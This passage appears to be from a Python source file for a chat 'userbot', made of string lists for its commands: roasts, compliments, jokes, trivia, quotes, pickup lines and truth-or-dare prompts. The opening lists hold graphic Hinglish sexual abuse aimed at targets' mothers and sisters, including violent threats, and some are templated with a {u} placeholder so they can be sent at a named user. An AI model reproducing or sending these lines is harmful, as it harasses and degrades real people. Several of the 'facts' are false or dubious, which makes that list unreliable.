    "teri behen ki chut mein tezaab daal ke clean kiya 💀🤣🖕","bc teri maa roz chudti hai tu yahan hero 🤣🖕🤡",
    "madarchod teri ammi ki chut ka dhakkan 😂💀🖕","gaandu teri behen ko ghoda chode pura mohalla dekhe 🤣💀🖕",
    "teri maa ki gaand mein bomb laga dunga 🔥💀😂🖕","chutiye teri behen ko pura mohalla chod ke thak gaya 😂💀🖕",
    "gaandu teri maa ki chut ka bhandara karunga 🤣🔥🖕","bc teri ammi ko bigda khila ke chodunga 🤣💀🖕",
    "teri behen ke peeche pura shahar aur tu yahan hero 🤣💀🖕","gaandu teri maa ko nanga karke kheton mein 🤣🖕💀",
    "madarchod teri ammi ko lekar bhag gaya pura mohalla 😂🖕💀","teri behen itni sasti uski rate menu mein likhi hai 🤣💀🖕",
]

ABUSE_L  = ["{u} 𝙏𝙀𝙍𝙄 𝙈𝘼𝘼 𝘾𝙃𝙊𝘿 𝘿𝘼𝙇𝙀𝙉𝙂𝙀 𝙍𝙀 𓂃〉〈🧊〉〈𓂃",
            "{u} 𝙏𝙀𝙍𝙄 𝙈𝘼𝘼 𝘾𝙃𝙊𝘿 𝘿𝘼𝙇𝙀𝙉𝙂𝙀 𝙍𝙀 𓂃〉〈💣〉〈𓂃",
            "{u} 𝙏𝙀𝙍𝙄 𝙈𝘼𝘼 𝘾𝙃𝙊𝘿 𝘿𝘼𝙇𝙀𝙉𝙂𝙀 𝙍𝙀 𓂃〉〈💀〉〈𓂃",]
ABUSE2_L = ["{u} ˚⋆﹒Tᴇʀɪ Mᴀ Kɪ Xʜᴜᴅᴀʏɪ Nᴀʜɪ Rᴜᴋᴜɴɢᴀ Pᴀɢʟᴇ ⋆´𓂃🩵",
            "{u} ˚⋆﹒Tᴇʀɪ Mᴀ Kɪ Xʜᴜᴅᴀʏɪ Nᴀʜɪ Rᴜᴋᴜɴɢᴀ Pᴀɢʟᴇ ⋆´𓂃🔥",]
SLAP_L   = ["ﾒ𓂃 👋🏻 *sʟᴀᴘs {u}!*","ﾒ𓂃 👋🏻 *ᴜsᴇs ᴀ ʙʀɪᴄᴋ ᴛᴏ sʟᴀᴘ {u}!*",]
REPLY_L  = ["{u} teri maa ka phone 📞💀","abe {u} nikal yahan se 😂🖕","{u} gaandu teri aukat nahi 💀",]
GOD_L    = ["Aaj me {u} teri maa codke India azaad crudnga 🇮🇳","abe {u} rndyke ❌💙","{u} Bohot cringe ey tu 🤮",]

ROASTS=[
    "You're the reason they put instructions on shampoo bottles 🧴",
    "Your parents must be so proud. By proud I mean horrified 💀",
    "I'd roast you but my parents said not to burn trash 🗑️",
    "You're not stupid — you just have bad luck thinking 🧠",
    "You're the human equivalent of a participation trophy 🏆",
    "Your vibe is an expired coupon — useless and outdated 🗓️",
    "Even your WiFi password is more secure than your future 📶",
    "You're proof that evolution can go backwards 🦕",
    "Even Google can't find your relevance 🔍",
    "Your personality has the energy of a wet napkin 🧻",
    "You're living proof that some things don't get better with age 🍷❌",
    "Your brain is like a browser with 500 tabs — all frozen 🖥️",
    "You're the human equivalent of a spoiler for a bad movie 🎬",
    "Your personality arrived as a free gift nobody wanted 🎁",
    "You're a limited edition of disappointment 📦",
    "Your vibes are a noise complaint 📢",
    "You're the plot hole nobody wanted to explain 📖",
    "Your personality is like decaf coffee — what's the point? ☕",
    "You peaked at birth and somehow it's gone downhill since 📉",
    "You're a cautionary tale without the lesson 📚",
    "You're not the dumbest person alive but you better hope they don't die 💀",
    "Your contribution to society is still pending review 📋",
    "You're the personification of error 404: personality not found 💻",
    "You have the range of a Nokia 3310 — basic and outdated 📱",
    "I've seen smarter things come out of cereal boxes 🥣",
    "Abe tu itna boring hai ke log tujhse milke neend ki goli band karte hain 😴",
    "Teri personality flat hai jitna tera future 🗿",
    "Tu itna slow hai ke tortoise bhi tujhe overtake kar le 💀",
    "Bhai tera dimag aur WiFi dono kaam nahi karte 📶",
    "Khud ko kya samajhta hai be, background NPC bhi zyada important 🤖",
    "Teri vibe ek dead phone battery jaisi hai 🔋",
    "Tujhe dekh ke Wikipedia 'most forgettable humans' update hota hai 📚",
    "Tera existence optional tha aur phir bhi mandatory ho gaya — tragedy 💀",
    "Tu itna useless hai ke Google bhi tujhe nahi dikhata 🔍",
    "Bhai teri soch utni choti hai jitni teri achievements — dono zero 🗿",
    "Tu NPC hai — na koi quest deta hai na koi importance 🤖",
    "Tera future darkroom mein print hota hai 🌑",
    "Tu existence waste kar raha hai 🏆",
    "Teri soch itni chhoti hai ke teri problems bhi tight fit hoti hain 🧠",
    "Bhai tujhe dekhke log apni life better samjhte hain 🙏",
    "Tera brain ek aisi machine hai jo sirf excuse generate karta hai 💻",
    "Tu certified background character hai 📹",
    "Teri aukat teri Instagram bio se bhi choti hai 📱",
    "Tu itna boring hai ke neend ki goli bhi tujhse inspire leti hai 💊",
    "Tere jokes sunke logo ka mood aur kharab ho jaata hai 😐",
    "Tu itna forgettable hai ke photo bhi blur kar leta hai 📸",
    "Teri presence aur absence mein room ka temperature same rehta hai 🌡️",
    "Bhai tu itna cringe hai ke secondhand embarrassment hota hai 😬",
    "Tera confidence teri ability se 10 guna zyada hai 🔧",
]
COMPLIMENTS=[
    "You're the human equivalent of a warm blanket on a cold night 🥰",
    "If kindness was a person it would be you 💖",
    "You make the world a better place just by existing ✨",
    "You're the type of person songs are written about 🎵",
    "Your energy is contagious in the best way possible 🌟",
    "You're genuinely one of the best people I know 💫",
    "You have the rare ability to make everyone feel seen 👁️",
    "You're the plot twist that made the story worth reading 📖",
    "You're the reason someone's day got better today 🌸",
    "The world genuinely needs more people like you 🌍",
    "Your presence alone changes the energy in a room ⚡",
    "You're the type of person who could make strangers feel like friends 🤝",
    "You carry yourself with a grace most people never find 👑",
    "You're proof that good people still exist 🌻",
    "Your heart is one of the biggest I've ever encountered 💝",
    "You turn ordinary moments into memories worth keeping 📸",
    "You're the kind of person people remember fondly forever 🌙",
    "You give off main character energy — the good kind 🎬",
    "You're the definition of hidden gem 💎",
    "You're rare and the world knows it 🌠",
    "You make hard things look effortless 💫",
    "You're someone people are lucky to know 🍀",
    "You're rare and the world knows it 🌠",
    "You give off main character energy 🎬",
    "You're the definition of hidden gem 💎",
    "Bhai teri yaari life mein sabse badi daulat hai 💛",
    "Tu dil ka bahut accha hai, sach mein 🥺",
    "Teri presence se room ka mood instantly shift hota hai ✨",
    "Tu main character energy deta hai — sahi wali ⚡",
    "Teri smile dekh ke bura mood thik ho jaata hai 😊",
    "Tera dil itna bada hai ke sab fit ho jaate hain 💖",
    "Bhai log tujhe milke khush rehte hain — wo rare hai 🌟",
    "Tu sirf exist karke logon ka din banata hai ☀️",
    "Teri soch alag hai — aur is duniya ko aisi soch chahiye 💡",
    "Tu built different hai bhai — genuinely 💪",
    "Teri friendship mein trust hai jo mil nahi dono ka 🤞",
    "Tu jo bhi karta hai full dil se karta hai 🔥",
    "Teri energy se positivity milti hai bhai 🌸",
    "Tera naam yaad rehta hai — aur wo baat hai 🌙",
    "Tu jahan jaata hai wahan vibe acha ho jaata hai 🎵",
    "Tujh jaisa doosra nahi milta — original copy hai tu 💎",
    "Log tujhe long time baad bhi yaad rakhte hain 📖",
    "Teri baat mein weight hai — log dhyaan dete hain 👑",
    "Tu ek accha insaan hai — genuinely, koi flattery nahi 🙏",
    "Teri loyalty ki koi duplicate nahi 🔒",
    "Tu woh dost hai jise har koi dhundhta hai 🍀",
    "Bhai tera heart of gold hai 💛",
    "Tu zindagi mein sabse zaruri cheez — ek real dost 🤗",
    "Teri wajah se duniya thodi better lagti hai 🌍",
]
INSULTS=[
    "Your IQ is so low you probably trip over wireless signals 📶",
    "You're proof evolution can go in reverse 🦕",
    "Even your reflection tries to look away 🪞",
    "Your brain is like a browser with 500 tabs — all frozen 🖥️",
    "You're as useful as a waterproof sponge 🧽",
    "You have the charisma of a hospital waiting room 🏥",
    "You're the reason one-star reviews exist ⭐",
    "Your attention span of a goldfish at a screen test 🐟",
    "You're what happens when autocorrect gives up 💻",
    "Your personality is like decaf coffee ☕",
    "You're the human equivalent of a loading screen 🔄",
    "You peaked at birth 📉",
    "Your vibe is a noise complaint 📢",
    "You're the personification of error 404 💻",
    "You have the range of a Nokia 3310 📱",
    "I've seen smarter things from cereal boxes 🥣",
    "You're a cautionary tale without the lesson 📚",
    "You bring so little to the table they charge you rent 🪑",
    "You're the plot hole nobody wanted 📖",
    "You make me believe in entropy 🌀",
    "Bhai tu NPC hai — na koi quest na koi importance 🤖",
    "Teri personality aur teri achievements dono zero 🗿",
    "Tu itna mid hai ke mediocre bhi reject kare 📊",
    "Tu existence waste kar raha hai 🏆",
    "Teri soch itni chhoti hai ke teri problems bhi tight fit hoti hain 🧠",
    "Tera brain ek aisi machine hai jo sirf excuse generate karta hai 💻",
    "Tu certified background character hai 📹",
    "Tu itna forgettable hai ke photo bhi blur kar leta hai 📸",
    "Tu itna cringe hai ke secondhand embarrassment hota hai 😬",
    "Tera confidence teri ability se 10 guna zyada hai 🔧",
    "Tu aisi movie hai jise log halfway mein chhod dete hain 🎬",
    "Teri personality copy paste hai — original kahan hai? 🖨️",
    "Tu woh typo hai jo spellcheck bhi nahi pakad paya 💻",
    "Teri life mein plot twist yeh hai ke koi plot hi nahi hai 📖",
    "Bhai tera rizz offline mode mein bhi nahi hai 📶",
    "Tu itna dull hai ke even ghosts avoid karte hain 👻",
    "Teri achievements ki list utni khaali hai jitna tera future 📋",
    "Tujhe dekh ke laga — evolution ek suggestion hai 🦕",
    "Bhai tu certified L hai — sealed, delivered 📦",
    "Teri life mein koi plot armor nahi — seedha NPC death 💀",
    "Tu itna boring hai ke neend ki goli bhi tujhse inspire leti hai 💊",
    "Tere jokes sunke logo ka mood aur kharab ho jaata hai 😐",
    "Teri presence aur absence mein room ka temperature same 🌡️",
    "Bhai tujhe dekhke log apni life better samjhte hain 🙏",
    "Tu itna slow hai ke tortoise bhi overtake kar le 💀",
    "Khud ko kya samajhta hai be, background NPC bhi zyada important 🤖",
    "Teri vibe ek dead phone battery jaisi hai 🔋",
    "Tujhe dekh ke Wikipedia page update hota hai 📚",
    "Tera existence optional tha — tragedy 💀",
    "Tu itna useless hai ke Google bhi tujhe nahi dikhata 🔍",
]
JOKES=[
    "Why don't scientists trust atoms? Because they make up everything! 😂",
    "I told my wife she was drawing her eyebrows too high. She looked surprised 😂",
    "What do you call a fish without eyes? A fsh 🐟",
    "Why did the scarecrow win an award? He was outstanding in his field 🌾",
    "I'm reading a book about anti-gravity. It's impossible to put down 📚",
    "What do you call fake spaghetti? An impasta 🍝",
    "Why did the bicycle fall over? Because it was two-tired 🚲",
    "I told a joke about paper. It was tearable 📄",
    "Why don't eggs tell jokes? They'd crack each other up 🥚",
    "What do you call cheese that isn't yours? Nacho cheese 🧀",
    "Why did the coffee file a police report? It got mugged ☕",
    "I used to hate facial hair but then it grew on me 🧔",
    "What do sprinters eat before a race? Nothing, they fast 🏃",
    "Why did the golfer bring extra pants? In case he got a hole in one 🏌️",
    "What's brown and sticky? A stick 🌿",
    "Why can't Cinderella play soccer? She always runs away from the ball 👟",
    "What do lawyers wear to court? Lawsuits 👔",
    "I asked my dog what two minus two is. He said nothing 🐕",
    "Why did the student eat his homework? Teacher said it was a piece of cake 🎂",
    "What's a vampire's favourite fruit? A blood orange 🍊",
    "Why is it impossible to trust stairs? They're always up to something 🪜",
    "I'm on a seafood diet. I see food and I eat it 🍔",
    "What do you call a dinosaur that crashes their car? Tyrannosaurus wrecks 🦕",
    "Why did the math book look so sad? Because it had too many problems 📘",
    "What do you call a bear with no teeth? A gummy bear 🐻",
    "Doctor ne kaha — kal aana. Main gaya. Usne kaha — kal aana. Main samajh gaya 😂",
    "Meri life itni boring hai ke even my problems fall asleep 😴",
    "Bhai mera dil toot gaya. Technician ne bola — warranty expired 💔",
    "Padhai karo — parents. Soye karo — body. Main karun toh kya karun?? 😭",
    "Mera GPA itna low hai ke calculator ne bhi resign kar diya 🧮",
    "Bhai interview mein poochha — weakness kya hai? Maine bola — honesty. 😂",
    "Life is short. Smile while you have teeth 😁",
    "Mere dost ne kaha — tu change ho gaya. Haan — abhi bhi pocket mein paisa nahi 💸",
    "School mein teacher ne kaha — future mein kya banna chahte ho? Maine bola — khush 😂",
    "Log kehte hain — sapne dekho. Maine dekha. Ab neend nahi aati 🌙",
    "Mera plan A fail hua. Plan B bhi. Plan C bhi. Ab main plan fail pe hun 📉",
    "Bhai pizza se pyar karna crime nahi — phir bhi slice nahi mila 🍕",
    "Meri kismat itni kharab hai ke lottery ticket kharide toh band ho jaaye 🎫",
    "Teacher ne kaha — intelligent log jawaab dete hain. Class chup. Main bhi chup. Sab intelligent 😌",
    "Bhai mera phone battery save mode mein tha — exactly meri life jaisi 🔋",
    "Maine socha entrepreneur banunga. Pehle ek idea aaya phir gaya 💼",
    "Meri height itni kam hai ke alarm clock tak pahunchne ke liye stool chahiye ⏰",
    "Bhai exam ke din sab dost mujhe yaad karte hain — answer ke liye 📝",
    "Mom ne kaha — room saaf karo. Maine karo na. Usne kaha — kal tak. Kal phir kal tha 📅",
    "Log kehte hain — mehnat karo. Maine ki. Phir bhi NPC ban gaya 🤖",
    "Bhai mera CV itna weak hai ke spam folder mein bhi reject ho gaya 📧",
    "Samajhdaar woh hai jo khamosh rahe. Main bahut zyada samajhdaar hun 🤐",
    "Dost ne kaha — tu change ho gaya. Haan — abhi bhi pocket mein paisa nahi hai 💸",
    "Meri body ek software hai jisme bugs hain aur developer ne support band kar diya 💻",
    "Bhai meri zindagi ek movie hai jisme protagonist woh hai par hero woh bhi nahi 🎬",
]
FACTS=["Honey never expires — 3000 year old honey found edible 🍯",
       "A group of flamingos is called a flamboyance 🦩",
       "Octopuses have three hearts and blue blood 🐙",
       "Bananas are curved because they grow towards the sun 🍌",
       "A day on Venus is longer than a year on Venus 🪐",
       "Cats can't taste sweet things 🐱",
       "Cleopatra lived closer to moon landing than pyramids 🏛️",
       "Butterflies taste with their feet 🦋","A snail can sleep for 3 years 🐌",
       "Wombat poop is cube-shaped 🐨","Twitter bird's name is Larry 🐦",
       "Sharks are older than trees 🦈","Hot water freezes faster than cold — Mpemba effect 🧊",
       "A bolt of lightning is 5x hotter than the sun ⚡",
       "The human body has enough iron to make a 3-inch nail 💪",
       "Cows have best friends and get stressed when separated 🐄",
       "You can't hum while holding your nose 🫀",
       "Koala fingerprints are indistinguishable from humans 🐨",
       "A day on Mars is 24h 37min — almost same as Earth 🔴",
       "A group of crows is called a murder 🪶",
       "The shortest war lasted 38-45 minutes (1896) ⚔️",
       "There are more stars than grains of sand on Earth 🌟",
       "The average cloud weighs 1.1 million pounds ☁️",
       "Your DNA is 60% identical to a banana 🍌",
       "Dolphins almost always dream 🐬",
       "Bhai insaan akela aisa jaanwar hai jo apne aap ko shisha mein pehchaanta hai 🪞",
       "Ek average insaan apni zindagi mein 6 saal sirf sapne dekhta hai 😴",
       "Hasna immunity boost karta hai 😄","Shatranj India se aaya — chess 'Shah Mat' se hai ♟️",
       "Raat ko onion khaane se neend acchi aati hai 🧅",
       "Duniya mein sabse zyada mango India mein hota hai 🥭",
       "Manushya ek ghante mein 800 words bolta hai par dimag 1200 sochta hai 🧠",
       "Chai peene se anxiety reduce hoti hai — L-theanine ☕",
       "Zero ka concept India ne diya — Brahmagupta 7th century 0️⃣",
       "Tulsi ke paas mosquito repellent properties hain 🌿",
       "India mein 22 official languages aur 400+ dialects 🇮🇳",
       "Insaan sirf 33% time sach bolta hai 🤥",
       "Shayad tu abhi subconsciously apni tongue ke paas apne daant gina raha hai 👅",
       "Insaan ki aankh 10 million colors distinguish kar sakti hai 👁️",
       "Neend ke time brain memories consolidate karta hai 😴",
       "Sabse zyada dream wala animal dolphin hai 🐬",
       "Khushi se zyada dard yaad rehta hai — negativity bias 🧠",
       "Ek din mein 35 decisions sirf khane ke baare mein karta hai insaan 🍽️",
       "Manushya ka DNA 60% kela se match karta hai 🍌",
       "Insaan 100,000 miles apni lifetime mein chalta hai 👟",
       "The inventor of Pringles is buried in a Pringles can 🥫",
       "The average person walks 100,000 miles in their lifetime 👟",
       "A bolt of lightning contains enough energy to toast 100,000 slices of bread ⚡",
]
QUOTES=['"The only way out is through." — Robert Frost',
        '"Do what you can, with what you have, where you are." — Roosevelt',
        '"Stay hungry, stay foolish." — Steve Jobs',
        '"It always seems impossible until it\'s done." — Nelson Mandela',
        '"You miss 100% of the shots you don\'t take." — Wayne Gretzky',
        '"The grind doesn\'t care about your feelings." — Anonymous',
        '"Success is not final, failure is not fatal." — Churchill',
        '"Do or do not. There is no try." — Yoda',
        '"Every expert was once a beginner." — Anonymous',
        '"Your only competition is who you were yesterday." — Anonymous',
        '"Pain is temporary. Quitting is forever." — Lance Armstrong',
        '"Work hard in silence. Let success make the noise." — Anonymous',
        '"Be the energy you want to attract." — Anonymous',
        '"Fall seven times, stand up eight." — Japanese Proverb',
        '"Your vibe attracts your tribe." — Anonymous',
        '"Lions don\'t lose sleep over the opinions of sheep." — Anonymous',
        '"The comeback is always stronger than the setback." — Anonymous',
        '"Dream big. Work hard. Stay humble." — Anonymous',
        '"What you get by achieving your goals is not as important as what you become." — Thoreau',
        '"Life is 10% what happens to you and 90% how you react." — Swindoll',
        '"Mushkilon se darna nahi chahiye, mushkilein tumse darti hain." — Anonymous',
        '"Haar woh nahi jab tum gir jaate ho, haar woh hai jab tum uthte nahi." — Anonymous',
        '"Safalta ka koi shortcut nahi — sirf mehnat ka highway hai." — Anonymous',
        '"Sapne wohi poore hote hain jinhe aankhon mein dekha jaata hai." — Abdul Kalam',
        '"Himmat karo, tabhi kamiyabi milegi." — Anonymous',
        '"Zindagi mein mushkilein aati hain toh aao — hum bhi toh yahan hain." — Anonymous',
        '"Kal ki chinta chhodo, aaj ko jeena seekho." — Anonymous',
        '"Mann ke haare haar hai, mann ke jeete jeet." — Anonymous',
        '"Koshish karne walon ki haar nahi hoti." — Harivansh Rai Bachchan',
        '"Taqdir koi change nahi karta — tum khud karo." — Anonymous',]
PICKUP_LINES=[
    "Are you a magician? Because whenever I look at you everyone disappears ✨",
    "Is your name Google? Because you have everything I've been searching for 🔍",
    "Are you Wi-Fi? Because I'm feeling a connection 📶",
    "Do you have a name, or can I call you mine? 💭",
    "Are you a bank loan? Because you have my interest 💰",
    "Are you a camera? Every time I look at you I smile 📸",
    "Is your name Netflix? Because I could watch you for hours 🎬",
    "Are you a shooting star? Because I've been wishing for you 🌠",
    "Are you a mirror? Because I see my future in you 🪞",
    "Do you like raisins? How do you feel about a date? 🍇",
    "Are you a campfire? Because you're hot and I want s'more 🔥",
    "Do you work at NASA? Because your smile is out of this world 🚀",
    "Are you a parking ticket? You've got fine written all over you 🎫",
    "Is your dad a boxer? Because you're a total knockout 🥊",
    "Are you a dictionary? Because you add meaning to my life 📖",
    "Teri aankhein itni gehri hain ke main dhoond hi raha tha aisa kuan 🌊",
    "Tu WiFi hai kya? Kyunki teri range mein aake connection feel hota hai 📶",
    "Teri smile dekh ke mera bad mood bhi bhool jaata hai ☀️",
    "Main GPS hoon aur tu meri destination hai 🗺️",
    "Tera naam kya hai — ya main tujhe apna bol sakta hun? 💭",
    "Teri aankhein ek novel jaisi hain — ek baar padha toh band nahi kiya 📖",
    "Tu meri playlist mein woh song hai jo repeat hota rehta hai 🎵",
    "Teri presence mein main thoda zyada khud hoon — aur yeh rare hai 🌸",
    "Teri smile meri sabse favourite notification hai 😊",
    "Tu meri life ki best unexpected plot twist hai 📖",]
RIZZ_LINES=[
    "You had me at the first glance 👁️","My heart does cardio when I see you 💓",
    "I was lost at sea until I found you 🌊","You're giving villain origin story vibes — you stole my heart 💀",
    "I didn't believe in soulmates until about 3 seconds ago 💫",
    "You're the main quest I've been ignoring side missions for 🎮",
    "You make eye contact feel like a whole conversation 👀",
    "You're the plot twist I didn't see coming 📖",
    "I have terrible rizz but exceptional taste — hence, you 👑",
    "This is either rizz or insanity — I'm going with rizz 🎯",
    "You must be a black hole because you're pulling me in 🌌",
    "You're the answer to a question I didn't know I was asking 💭",
    "Are you WiFi? Because I feel a strong connection 📶",
    "If I were a pirate I'd make you walk the plank — towards me ☠️",
    "My rizz has a 10% success rate. But with you I'd risk those odds 🎲",
    "Teri aankhein WiFi jaisi hain — automatically connect ho jaata hun 📶",
    "Bhai main GPS nahi hun phir bhi tujh tak aa gaya 🗺️",
    "Teri smile dekh ke main apna plan bhool jaata hun 😌",
    "Main thoda boring hun — par tere saath nahi 🎵",
    "Teri energy match karta hai meri energy — rare hai yaar 🔥",
    "Tujhe dekh ke heart bola — bhai concentrate kar 💓",
    "Teri baat sunne ke baad baaki sab boring lagti hai 🎧",
    "Main bahut confident hun — par tere saamne thoda shayad nahi 😅",
    "Teri presence mein time ka hisaab nahi rehta ⏰",
    "Main generally bland hun — par tere saath colors dikhte hain 🎨",]
MOTIVATIONS=[
    "You're one step away from greatness. Take it 💪","The grind doesn't lie. Stay locked in ⚡",
    "Every expert was once a beginner. Keep going 🔥","Doubt kills more dreams than failure ever will 🌟",
    "You didn't come this far to only come this far 🏆","The comeback is always stronger than the setback 💫",
    "Do it scared. Do it tired. Just do it 🫀","Your future self is watching. Don't let them down 👁️",
    "Small steps daily beat big jumps occasionally 🐢","You've survived 100% of your worst days 🛡️",
    "The grind is quiet. The results are loud 🔇🔊","Pressure makes diamonds. Keep going 💎",
    "The goal isn't perfection. The goal is consistency 📈","Win the morning, win the day 🌄",
    "If it doesn't challenge you it doesn't change you 💪",
    "Success is rented and rent is due every day 🏠","Rest if you must. But don't quit 😤",
    "Be stubborn about your goals but flexible about your methods 🔄",
    "Who you're becoming matters more than where you are 🌱",
    "Your story isn't over — the best chapters are ahead 📖",
    "Uth bhai — tera waqt aaya hai 🌅","Haar mat — koshish ka ek aur round baki hai 🥊",
    "Toot ke bhi jo sambhal le woh champion hai 🏆","Mehnat mein shortcut nahi — par result mein guarantee 🎯",
    "Teri zindagi ka director tu hi hai — script likhta ja 🎬",
    "Jo abhi mushkil hai woh kal strength ban jaayega 💪","Ruk mat bhai — manzil paas hai 🚶",
    "Sapne tab poore hote hain jab neend se uthke kaam karo 🌙",
    "Haar maan lena option nahi — aage badhna hai 🔥","Tu dekh lena ek din — sabko pata chalega 🌟",
    "Khud pe bharosa rakh — yeh sabse badi taaqat hai 💫",
    "Dard temporary hai — pride permanent hai 🏅","Ziddi reh apne sapnon ke liye — koi nahi rokega 🚀",
    "Ek baar aur try — bas ek baar aur 💪","Apna future khud bana — warna koi aur bana dega 🏗️",
    "Har baar seedha uthna — yehi zindagi hai 💎",
    "Aaj ka sacrifice kal ki success ka raasta hai 🌱",
    "Log yaad karte hain unhe jo ruke nahi — tu bhi yaad rahega 🌍",
    "Gir bhi gaya toh kya — uthna toh aata hai na? 🛡️",
    "Andhere mein bhi apna raasta dekh — andar ki roshni kaafi hai 🔦",
    "Teri mehnat dekh raha hai koi upar se — bharosa rakh 🙏",]

ROAST_VERDICTS=["skill issue","go touch grass","certified moment","not my problem","based",
                "L + ratio","W","this ain't it","ratio + fell off","cope + seethe",
                "rip bozo 🪦","gg no re","mid take","NPC behaviour","bhai chhod",]
SIGMA_LEVELS=["Sigma","Gigachad","Alpha","Beta","Omega","Delulu","Zeta"]
GIGACHAD_RANKS=["Gigachad","Ultra Sigma","Based God","NPC","Certified L","Error 404","Mid"]
CRINGE_TIERS=["Mildly Cringe","Mega Cringe","Terminal Cringe","NPC Cringe","Certified Cringe"]
BASED_LEVELS=["Based","Ultra Based","Certified W","Goated","Built Different","Real One"]
NPC_TYPES=["Background NPC","Tutorial NPC","Shop NPC","Boss NPC","Deleted NPC","Error NPC"]
THREAT_LEVELS=["Low 🟢","Medium 🟡","High 🔴","Chaotic 🌀","Error 💀","Inactive ⚫","God Mode 🟣"]
ABILITY_TAGS=["Gaslighting","Manipulation","Rizz","Delusion","NPC Energy","Main Character Syndrome",
              "Plot Armor","Aura Damage","Sigma Mindset","Bhai vibe","Kalesh Unlocked"]
DIAGNOSES=["Chronic Delusion Disorder","Acute NPC Syndrome","Terminal Cringe","Sigma Deficiency",
           "Rizz Withdrawal","Main Character Syndrome","Aura Deficit Disorder","Skill Issue Disorder"]
ANIMAL_SPIRITS=["Wolf — lone, strategic, misunderstood 🐺","Lion — loud, proud, sleeps 20 hours 🦁",
                "Fox — clever, sneaky, charming 🦊","Turtle — slow, steady, will outlast everyone 🐢",
                "Octopus — smart, multiple personalities, weird 🐙","Dragon — feared, rare, powerful 🐉"]
SUPERPOWERS=["Invisibility when the bill arrives","Chronically online telepathy",
             "Screenshot without notification","Selective hearing (advanced)",
             "Reply-dodging speed force","Gaslighting at the speed of light",
             "404: Accountability Not Found","Turning left swipe into right"]
RIZZ_SCORES=["Wifi rizz — connects but drops every 5 mins","Offline rizz — not even trying",
             "Crypto rizz — sounds good delivers nothing","God-tier rizz — they don't know it yet",
             "NPC rizz — scripted and cringe","Certified rizz — actually works somehow"]
FUTURE_PREDS=["You will trip over a charger in the next 48 hours",
              "A meme will hit different for you this week",
              "Someone will text you at 3AM with bad vibes",
              "You'll accidentally like a 4-year-old post",
              "Kal subah late uthoge aur phir bhi thak jaoge",
              "Agle hafte ek random compliment milega stranger se",
              "Teri battery 1% pe hogi jab tujhe zyada zarurat hogi",]
GOSSIP_POOL=["ate 3 portions at lunch and said 'I barely eat'",
             "typed 'lol' but wasn't actually laughing",
             "still uses Comic Sans unironically",
             "reads everyone's story but never replies",
             "has a voice note of 10 minutes they've never sent",
             "said 'I'm on my way' while still in bed",
             "ne apna hi photo like karke unlike kiya",
             "3 baje active hota hai par 'busy' rehta hai",]
LORE_ENTRIES=["was once feared across 7 different group chats",
              "has never lost an argument — they just got muted",
              "once caused three admins to resign in one night",
              "ghosted an entire server and they still wait",
              "bhai 3 groups ka owner hai aur teeno mein banned hai",]
CRIMINAL_RECS=["Sending voice notes over 3 minutes",
               "Going offline mid-conversation",
               "Leaving groups without notice",
               "Using emojis unironically after 2020",
               "Sending 'k' as a full reply",
               "Bhai group mein good morning photo bheja",
               "3AM pe 'you up?' bhejne ki aadat",]
WANTED_CRIMES=["Texting 'nm u?' to every conversation",
               "Being perpetually online but 'busy'",
               "Typing for 3 minutes then sending 'ok'",
               "'be right back' — 3 din baad wapas aana",]
COURT_VERDICTS_FUN=["Guilty on all counts 🔨","Innocent by reason of delusion 🌀",
                    "Sentence: touch grass for 30 days 🌿",
                    "Acquitted — but we're watching 👁️",
                    "Guilty — take the L and leave 📦",]
SIGMA_GRINDSET=["Wake up at 4AM, stare at ceiling, go back to sleep 😤",
                "Eat, sleep, grind, repeat. Mostly sleep 😴",
                "No cap, no clue, full send 🚀",
                "The sigma never responds first — they also never get replied to 📱",]
COOKED_LABELS=["Slightly warm","Medium rare","Well done","FULLY COOKED 🔥"]
BRAINCELL_LABELS=["Critically endangered","Concerning","Functional","Actually impressive"]
FIRST_IMPRESSIONS=["Immediately suspicious. No reason. Just vibes.",
                   "Main character energy. Slightly unhinged.",
                   "NPC until proven otherwise.",
                   "Pehli nazar mein laga — yeh banda apni hi film ka hero samajhta hai.",
                   "Iska vibe ek dum sus hai — but intriguing bhi.",]
EIGHTBALL=["It is certain ✅","Outlook is good 🌟","Yes definitely 💯","Signs point to yes 🔮",
           "Without a doubt ✅","Most likely ✅","Reply hazy, try again 🌫️","Ask again later ⏳",
           "Don't count on it ❌","My reply is no ⛔","My sources say no 📊",
           "Outlook not so good ☁️","Very doubtful 🤔","Absolutely not 🚫",
           "Haan bhai, full send kar. ✅","Nahi yaar, iska time nahi aaya abhi. ❌",
           "Pata nahi — ek kaam kar, soja aur kal dekh. 🎱",
           "Seriously? Yeh pooch raha hai tu? 🙄","Bhagwan bhi confused hai is sawaal pe. 🎱",]
ADJECTIVES=["cursed","gigachad","legendary","certified L","goated","mid","unhinged","NPC",
            "built different","touched","chronically online","delulu","based","cringe",
            "sigma","real one","main character","background character","villain coded",]
TRUTHS=["What's your biggest fear?","Have you ever lied to a close friend?",
        "What's the most embarrassing thing that's happened to you?",
        "Who do you have a crush on?","Have you ever cheated on a test?",
        "What's your most toxic trait?","When did you last cry and why?",
        "Have you ever ghosted someone you liked?","What's your biggest regret?",
        "What's a lie you've repeated so many times you almost believe it?",
        "Tune kabhi kisi ko dhoka diya?","Teri sabse buri habit kya hai?",
        "Tujhe sabse zyada kiska message aane se khushi hoti hai?",
        "Teri zindagi ka sabse bada raaz kya hai?",
        "Tere mann mein kaise thoughts aate hain jab akela hota hai?",]
DARES=["Send a voice note singing your favourite song",
       "Change your bio to something weird for 1 hour",
       "Send your last 3 texts to the group","Text your crush right now",
       "Post an embarrassing photo in the group",
       "Let someone else post one thing from your phone",
       "Apne phone mein 10 unseen notifications kholo live",
       "Apni awkward photo share karo",
       "Group mein ek Hindi shayari sunao",
       "Voice note mein gao — sahi ya galat",
       "Group admin ko compliment do — genuinely",
       "Last received meme forward karo",]
MARRY_COMMENTS=["Ghar wale approve karenge.","Arrange ya love — dono mein risk hai.",
                "Partner score decent hai — baaki toh kismat.",]
FUMBLE_MOVES=["missed a massive W","tripped at the finish line",
              "self-sabotaged flawlessly","mauka tha — gaya bhi",]
LUCK_COMMENTS=["Aaj tera din hai bhai","Thoda aur sabr kar yaar",
               "Upar wala dekh raha hai","Coin flip energy",]
DRIP_COMMENTS=["Swag on point.","Fit check passed.",
               "Bhai kapde toh theek hain — attitude thoda zyada hai.",]
# ══════════════════════════════════════════════════════════════════
#   MENUS
# ══════════════════════════════════════════════════════════════════
PAGES = {
"main": (
    "🔥⚡ ʜᴜʙsᴛ ᴜsᴇʀʙᴏᴛ  ᴠ4.0 ⚡🔥\n"
